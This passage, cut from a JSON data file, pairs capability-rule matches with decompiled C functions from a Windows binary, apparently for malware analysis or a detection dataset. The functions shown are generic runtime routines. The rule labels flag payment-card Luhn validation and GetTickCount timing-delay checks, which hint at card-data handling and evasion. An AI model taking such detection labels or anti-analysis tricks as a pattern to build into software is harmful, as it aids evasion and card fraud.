halt_baddata();\n            case 0xe:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            default:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x10:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x11:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x12:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x13:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x14:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x15:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x16:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x17:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x19:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1a:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1c:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1d:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1e:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1f:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x20:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n        iVar2 = *(iVar8 + in_EAX);\n        iVar3 = *in_EAX;\n        if (8 < iVar8) {\n            iVar4 = in_EAX[1];\n            if (0x10 < iVar8) {\n                param_2[2] = ROUND(in_EAX[2]);\n            }\n            param_2[1] = ROUND(iVar4);\n        }\n        *param_2 = ROUND(iVar3);\n        *(iVar8 + param_2) = ROUND(iVar2);\n    }\ncode_r0x00403131:\n    return;\n}\n",
        "token_count": 1536
    },
    "004033b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004033b8(void)\n\n{\n    int32_t iVar1;\n    uchar auStack8 [8];\n    \n    iVar1 = sub.kernel32.dll_QueryPerformanceCounter();\n    if (iVar1 != 0) {\n        *0x491008 = auStack8;\n        return;\n    }\n    *0x491008 = sub.kernel32.dll_GetTickCount();\n    return;\n}\n",
        "token_count": 84
    },
    "00403970": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403970(uint8_t param_1, uint8_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t *in_EAX;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    \n    uVar3 = *param_2;\n    uVar2 = *in_EAX + uVar3;\n    if (((!CARRY1(*in_EAX, uVar3)) && (uVar2 <= param_1)) ||\n       (uVar3 = param_1 - *in_EAX,  uVar2 = param_1,  *in_EAX <= param_1 && uVar3 != 0)) {\n        uVar1 = *in_EAX;\n        *in_EAX = uVar2;\n        puVar5 = param_2 + 1;\n        puVar6 = in_EAX + uVar1 + 1;\n        for (uVar4 = uVar3; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar6 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar6 = puVar6 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 300
    },
    "00403af4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403af4(uchar param_1, int32_t param_2)\n\n{\n    ulong uVar1;\n    ulong *in_EAX;\n    ushort uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    \n    uVar2 = CONCAT11(param_1, param_1);\n    if (0x1f < param_2) {\n        *in_EAX = uVar2;\n        *(in_EAX + 2) = uVar2;\n        *(in_EAX + 4) = uVar2;\n        *(in_EAX + 6) = uVar2;\n        uVar1 = *in_EAX;\n        *(param_2 + -0x10 + in_EAX) = uVar1;\n        *(param_2 + -8 + in_EAX) = uVar1;\n        iVar3 = (in_EAX & 7) - 8;\n        iVar4 = param_2 + -0x10 + iVar3;\n        iVar3 = iVar4 - iVar3;\n        iVar4 = -iVar4;\n        do {\n            *(in_EAX + iVar4 + iVar3) = uVar1;\n            *(in_EAX + iVar4 + 8 + iVar3) = uVar1;\n            bVar5 = SCARRY4(iVar4, 0x10);\n            iVar4 = iVar4 + 0x10;\n        } while (bVar5 != iVar4 < 0);\n        return;\n    }\n    *(param_2 + -1 + in_EAX) = param_1;\n    switch(param_2) {\n    default:\n        return;\n    case 0x1e:\n    case 0x1f:\n        *(in_EAX + 0x1c) = uVar2;\n    case 0x1c:\n    case 0x1d:\n        *(in_EAX + 0x1a) = uVar2;\n    case 0x1a:\n    case 0x1b:\n        *(in_EAX + 3) = uVar2;\n    case 0x18:\n    case 0x19:\n        *(in_EAX + 0x16) = uVar2;\n    case 0x16:\n    case 0x17:\n        *(in_EAX + 0x14) = uVar2;\n    case 0x14:\n    case 0x15:\n        *(in_EAX + 0x12) = uVar2;\n    case 0x12:\n    case 0x13:\n        *(in_EAX + 2) = uVar2;\n    case 0x10:\n    case 0x11:\n        *(in_EAX + 0xe) = uVar2;\n    case 0xe:\n    case 0xf:\n        *(in_EAX + 0xc) = uVar2;\n    case 0xc:\n    case 0xd:\n        *(in_EAX + 10) = uVar2;\n    case 10:\n    case 0xb:\n        *(in_EAX + 1) = uVar2;\n    case 8:\n    case 9:\n        *(in_EAX + 6) = uVar2;\n    case 6:\n    case 7:\n        *(in_EAX + 4) = uVar2;\n    case 4:\n    case 5:\n        *(in_EAX + 2) = uVar2;\n    case 2:\n    case 3:\n        *in_EAX = uVar2;\n        return;\n    }\n}\n",
        "token_count": 781
    },
    "00403cc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00403cc4(void)\n\n{\n    uint uVar1;\n    char cStack264;\n    \n    fcn.00405530();\n    fcn.00403cb8();\n    uVar1 = fcn.00405794();\n    while (cStack264 == -1) {\n        fcn.00403cb8();\n        fcn.00405794();\n        fcn.00405818();\n        fcn.00405530();\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 115
    },
    "00403fdc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403fdc(int32_t param_1, uchar *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    \n    if ((*(in_EAX + 4) == -0x284e) || (cVar1 = fcn.00403f98(param_1, param_2),  cVar1 != '\\0')) {\n        while( true ) {\n            puVar3 = *(in_EAX + 0x14) + *(in_EAX + 0xc);\n            iVar2 = *(in_EAX + 8) - *(in_EAX + 0xc);\n            if (param_1 < iVar2) break;\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + iVar2;\n            param_1 = param_1 - iVar2;\n            for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = *param_2;\n                param_2 = param_2 + 1;\n                puVar3 = puVar3 + 1;\n            }\n            iVar2 = (**(in_EAX + 0x1c))();\n            if (iVar2 != 0) {\n                fcn.0040307c();\n                return in_EAX;\n            }\n        }\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + param_1;\n        for (; param_1 != 0; param_1 = param_1 + -1) {\n            *puVar3 = *param_2;\n            param_2 = param_2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n    }\n    return in_EAX;\n}\n",
        "token_count": 399
    },
    "00404618": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00404618(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + -0x28);\n}\n",
        "token_count": 33
    },
    "00404620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404620(uint param_1, char param_2)\n\n{\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "004046d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004046d4(int32_t **param_1, code *UNRECOVERED_JUMPTABLE)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t **ppiVar2;\n    \n    if (UNRECOVERED_JUMPTABLE < 0xff000000) {\n        if (0xfdffffff < UNRECOVERED_JUMPTABLE) {\n    // WARNING: Could not recover jumptable at 0x004046eb. Too many branches\n    // WARNING: Treating indirect jump as call\n            (**(UNRECOVERED_JUMPTABLE + *in_EAX))();\n            return;\n        }\n    // WARNING: Could not recover jumptable at 0x004046ed. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*UNRECOVERED_JUMPTABLE)();\n        return;\n    }\n    ppiVar2 = *((UNRECOVERED_JUMPTABLE & 0xffffff) + in_EAX);\n    if (ppiVar2 == NULL) {\n        piVar1 = *param_1;\n        *param_1 = NULL;\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 8))(piVar1);\n        }\n        return;\n    }\n    (*(*ppiVar2)[1])(ppiVar2, param_1, ppiVar2);\n    piVar1 = *ppiVar2;\n    *ppiVar2 = param_1;\n    if (piVar1 == NULL) {\n        return;\n    }\n    (**(*piVar1 + 8))(piVar1);\n    return;\n}\n",
        "token_count": 359
    },
    "00404798": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00404798(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    do {\n        piVar1 = *(in_EAX + -0x48);\n        if (piVar1 != NULL) {\n            iVar2 = *piVar1;\n            piVar1 = piVar1 + 1;\n            do {\n                if ((((*param_2 == *piVar1) && (param_2[1] == piVar1[1])) && (param_2[2] == piVar1[2])) &&\n                   (param_2[3] == piVar1[3])) {\n                    return piVar1;\n                }\n                piVar1 = piVar1 + 7;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        if (*(in_EAX + -0x24) == NULL) {\n            return NULL;\n        }\n        in_EAX = **(in_EAX + -0x24);\n    } while( true );\n}\n",
        "token_count": 251
    },
    "0040481c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040481c(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint16_t unaff_SI;\n    uint16_t *puVar2;\n    bool bVar3;\n    \n    do {\n        puVar2 = *(in_EAX + -0x30);\n        if (puVar2 != NULL) {\n            uVar1 = *puVar2;\n            bVar3 = puVar2 + 1 == NULL;\n            puVar2 = puVar2 + 1;\n            do {\n                if (uVar1 == 0) break;\n                uVar1 = uVar1 - 1;\n                bVar3 = unaff_SI == *puVar2;\n                puVar2 = puVar2 + 1;\n            } while (!bVar3);\n            if (bVar3) {\n                return;\n            }\n        }\n        if (*(in_EAX + -0x24) == NULL) {\n            return;\n        }\n        in_EAX = **(in_EAX + -0x24);\n    } while( true );\n}\n",
        "token_count": 236
    },
    "00404890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00404890(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + -0x3c);\n}\n",
        "token_count": 34
    },
    "004048d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004048d4(uint param_1, uint8_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint16_t *puVar4;\n    uint32_t uVar5;\n    \n    uVar1 = 0;\n    uVar5 = 0;\n    uVar3 = *param_2;\n    while( true ) {\n        puVar4 = *(in_EAX + -0x34);\n        if (puVar4 != NULL) {\n            uVar5 = uVar5 & 0xffff0000 | *puVar4;\n            puVar4 = puVar4 + 1;\n            do {\n                uVar2 = uVar1 & 0xffffff00;\n                if (*(puVar4 + 3) == uVar3) {\n                    uVar2 = uVar1 & 0xffff0000 | *(puVar4 + 3);\n                    while (((*(uVar2 + 6 + puVar4) ^ param_2[uVar2]) & 0xdf) == 0) {\n                        uVar2 = uVar2 - 1;\n                        if (uVar2 == 0) {\n                            return *(puVar4 + 1);\n                        }\n                    }\n                    uVar3 = *param_2;\n                }\n                uVar1 = uVar2 & 0xffff0000 | *puVar4;\n                puVar4 = puVar4 + uVar1;\n                uVar5 = uVar5 - 1;\n            } while (uVar5 != 0);\n        }\n        if (*(in_EAX + -0x24) == NULL) break;\n        in_EAX = **(in_EAX + -0x24);\n    }\n    return 0;\n}\n",
        "token_count": 401
    },
    "004049cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004049cc(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4049fb;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    (**(*in_EAX + -0x1c))();\n    *in_FS_OFFSET = uStack32;\n    return in_EAX;\n}\n",
        "token_count": 132
    },
    "00404eec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00404eec(void)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint *in_FS_OFFSET;\n    uint *in_stack_00000014;\n    int32_t in_stack_00000030;\n    \n    *(in_stack_00000030 + 4) = 0x404f37;\n    piVar3 = fcn.00407688();\n    piVar2 = *piVar3;\n    *piVar3 = *piVar2;\n    piVar2 = piVar2[3];\n    puVar1 = piVar2 + 1;\n    *puVar1 = *puVar1 & 0xfffffffd;\n    if (*piVar2 != 0xeedfade) {\n        fcn.00404650();\n        fcn.00404a2c();\n    }\n    *in_stack_00000014 = **in_FS_OFFSET;\n    return 1;\n}\n",
        "token_count": 213
    },
    "00404f88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404f88(int32_t *arg_8h)\n\n{\n    fcn.00402ff8();\n    return;\n}\n",
        "token_count": 34
    },
    "0040521c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040521c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *in_EAX;\n    do {\n        fcn.00407550();\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 73
    },
    "00405244": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405244(void)\n\n{\n    int32_t *in_EAX;\n    int32_t **ppiVar1;\n    int32_t iVar2;\n    \n    iVar2 = *in_EAX;\n    ppiVar1 = in_EAX + 1;\n    do {\n        **ppiVar1 = *ppiVar1[1] + ppiVar1[2];\n        ppiVar1 = ppiVar1 + 3;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    return;\n}\n",
        "token_count": 121
    },
    "00405554": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405554(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    \n    do {\n        iVar2 = *in_EAX;\n        if ((iVar2 != 0) && (*in_EAX = 0,  0 < *(iVar2 + -8))) {\n            LOCK();\n            piVar1 = iVar2 + -8;\n            *piVar1 = *piVar1 + -1;\n            if (*piVar1 == 0) {\n                fcn.00402f1c();\n            }\n        }\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return;\n}\n",
        "token_count": 183
    },
    "004055f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.004055f4(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    if (0 < in_EAX) {\n        puVar1 = fcn.00402f00();\n        *(((in_EAX + 10U & 0xfffffffe) - 2) + puVar1) = 0;\n        puVar1[1] = in_EAX;\n        *puVar1 = 1;\n        return puVar1 + 2;\n    }\n    return NULL;\n}\n",
        "token_count": 118
    },
    "0040568c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040568c(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_1 < 1) {\n        fcn.00405530(param_2);\n    }\n    else if ((param_1 + 1 < 0x7ff) && (iVar1 = fcn.00405650(param_1),  -1 < iVar1)) {\n        fcn.00405620();\n    }\n    else {\n        fcn.00405c6c();\n        fcn.00405650(param_1);\n        fcn.00405c6c();\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "00405728": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405728(uint param_1, char *param_2)\n\n{\n    uint uVar1;\n    uint *in_EAX;\n    char *pcVar2;\n    \n    pcVar2 = param_2;\n    if (param_2 != NULL) {\n        for (; (((*pcVar2 != '\\0' && (pcVar2[1] != '\\0')) && (pcVar2[2] != '\\0')) && (pcVar2[3] != '\\0'));\n            pcVar2 = pcVar2 + 4) {\n        }\n    }\n    uVar1 = fcn.004055f4();\n    if (param_2 != NULL) {\n        fcn.004030fc();\n    }\n    fcn.00405530();\n    *in_EAX = uVar1;\n    return;\n}\n",
        "token_count": 182
    },
    "004057a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004057a0(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *in_EAX;\n    char *pcVar3;\n    \n    pcVar3 = param_2;\n    do {\n        if (param_1 == 0) break;\n        param_1 = param_1 + -1;\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    uVar2 = fcn.004055f4();\n    if (param_2 != NULL) {\n        fcn.004030fc();\n    }\n    fcn.00405530();\n    *in_EAX = uVar2;\n    return;\n}\n",
        "token_count": 176
    },
    "004057b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004057b8(uint32_t param_1, int16_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t arg_8h;\n    int16_t *piVar3;\n    bool bVar4;\n    \n    bVar4 = true;\n    uVar2 = param_1;\n    piVar3 = param_2;\n    do {\n        if (uVar2 == 0) break;\n        uVar2 = uVar2 - 1;\n        bVar4 = *piVar3 == 0;\n        piVar3 = piVar3 + 1;\n    } while (!bVar4);\n    if (bVar4) {\n        uVar2 = ~uVar2;\n    }\n    arg_8h = uVar2 + param_1;\n    if (arg_8h < 1) {\n        fcn.00405530(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.00405650(arg_8h),  -1 < iVar1)) {\n        fcn.00405620();\n    }\n    else {\n        fcn.00405c6c();\n        fcn.00405650(arg_8h);\n        fcn.00405c6c();\n    }\n    return;\n}\n",
        "token_count": 304
    },
    "00405818": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.00405818(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    \n    if (param_2 == 0) {\n        return;\n    }\n    iVar2 = *in_EAX;\n    if (iVar2 != 0) {\n        if (!SCARRY4(*(param_2 + -4), *(iVar2 + -4))) {\n            if (param_2 == iVar2) {\n                fcn.00405c6c();\n            }\n            else {\n                fcn.00405c6c();\n            }\n            fcn.004030fc();\n            return;\n        }\n        if (*0x495008 != NULL) {\n            (**0x495008)(param_2);\n        }\n        fcn.00402ff8();\n        return;\n    }\n    if (param_2 != 0) {\n        iVar2 = *(param_2 + -8);\n        if (iVar2 == -1 || SCARRY4(iVar2, 1) != iVar2 + 1 < 0) {\n            param_2 = fcn.004055f4(param_2);\n            fcn.004030fc();\n        }\n        else {\n            LOCK();\n            *(param_2 + -8) = *(param_2 + -8) + 1;\n        }\n    }\n    iVar2 = *in_EAX;\n    *in_EAX = param_2;\n    if ((iVar2 != 0) && (0 < *(iVar2 + -8))) {\n        LOCK();\n        piVar1 = iVar2 + -8;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.00402f1c();\n        }\n    }\n    return;\n}\n",
        "token_count": 418
    },
    "00405864": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.00405864(int32_t **param_1, int32_t **param_2)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t **ppiVar3;\n    int32_t **in_EAX;\n    int32_t iVar4;\n    \n    ppiVar3 = param_1;\n    if ((param_2 != NULL) && (ppiVar3 = param_2,  param_1 != NULL)) {\n        if (param_2 != *in_EAX) {\n            if (param_1 == *in_EAX) {\n                in_EAX = param_2;\n                if (!SCARRY4(param_2[-1], param_1[-1])) {\n                    iVar4 = fcn.004055f4();\n                    fcn.004030fc();\n                    fcn.004030fc();\n                    if (iVar4 != 0) {\n                        *(iVar4 + -8) = *(iVar4 + -8) + -1;\n                    }\n                    fcn.00405584();\n                    return;\n                }\n                goto code_r0x00403004;\n            }\n            fcn.00405584();\n        }\n        if (param_1 == NULL) {\n            return;\n        }\n        ppiVar2 = *in_EAX;\n        ppiVar3 = param_1;\n        if (ppiVar2 != NULL) {\n            if (!SCARRY4(param_1[-1], ppiVar2[-1])) {\n                if (param_1 == ppiVar2) {\n                    fcn.00405c6c();\n                }\n                else {\n                    fcn.00405c6c();\n                }\n                fcn.004030fc();\n                return;\n            }\ncode_r0x00403004:\n            if (*0x495008 != NULL) {\n                (**0x495008)(param_1, in_EAX);\n            }\n            fcn.00402ff8();\n            return;\n        }\n    }\n    if (ppiVar3 != NULL) {\n        piVar1 = ppiVar3[-2];\n        if (piVar1 == 0xffffffff || SCARRY4(piVar1, 1) != piVar1 + 1 < 0) {\n            ppiVar3 = fcn.004055f4(ppiVar3);\n            fcn.004030fc();\n        }\n        else {\n            LOCK();\n            ppiVar3[-2] = ppiVar3[-2] + 1;\n        }\n    }\n    piVar1 = *in_EAX;\n    *in_EAX = ppiVar3;\n    if ((piVar1 != NULL) && (0 < piVar1[-2])) {\n        LOCK();\n        piVar1 = piVar1 + -2;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.00402f1c();\n        }\n    }\n    return;\n}\n",
        "token_count": 654
    },
    "004058e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.004058e0(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    bool bVar5;\n    code *UNRECOVERED_JUMPTABLE;\n    int32_t iStack24;\n    \n    piVar4 = NULL;\n    piVar1 = *(&stack0x00000000 + param_2 * 4);\n    if ((piVar1 == NULL) || (*in_EAX != piVar1)) {\n        iVar2 = 0;\n        iVar3 = param_2;\n    }\n    else {\n        iVar2 = piVar1[-1];\n        iVar3 = param_2 + -1;\n        piVar4 = piVar1;\n    }\n    do {\n        piVar1 = *(&stack0x00000000 + iVar3 * 4);\n        if (piVar1 != NULL) {\n            bVar5 = SCARRY4(iVar2, piVar1[-1]);\n            iVar2 = iVar2 + piVar1[-1];\n            if (bVar5) {\n                if (*0x495008 != NULL) {\n                    (**0x495008)();\n                }\n                fcn.00402ff8();\n                return;\n            }\n            if (piVar4 == piVar1) {\n                piVar4 = NULL;\n            }\n        }\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    if (piVar4 == NULL) {\n        iStack24 = fcn.004055f4();\n    }\n    else {\n        fcn.00405c6c();\n        iStack24 = *in_EAX;\n        param_2 = param_2 + -1;\n        piVar4 = in_EAX;\n    }\n    do {\n        if (*(&stack0x00000000 + param_2 * 4) != 0) {\n            fcn.004030fc();\n        }\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    if (piVar4 == NULL) {\n        if (iStack24 != 0) {\n            *(iStack24 + -8) = *(iStack24 + -8) + -1;\n        }\n        fcn.00405584();\n    }\n    // WARNING: Could not recover jumptable at 0x00405969. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*UNRECOVERED_JUMPTABLE)();\n    return;\n}\n",
        "token_count": 589
    },
    "00405a44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405a44(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((((in_EAX == 0) || (*(in_EAX + -4) == 0)) || ((0 < param_2 && (*(in_EAX + -4) <= param_2 + -1)))) ||\n       (param_1 < 0)) {\n        fcn.00405530();\n    }\n    else {\n        fcn.00405620();\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "00405a84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405a84(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.00405a34();\n    if (*in_EAX != 0) {\n        if (((0 < param_2) && (param_2 + -1 < *(*in_EAX + -4))) && (0 < param_1)) {\n            fcn.004030fc();\n            fcn.00405c6c();\n        }\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "00405acc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405acc(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        fcn.00405c6c();\n        fcn.004030fc();\n        fcn.004030fc();\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "00405b28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
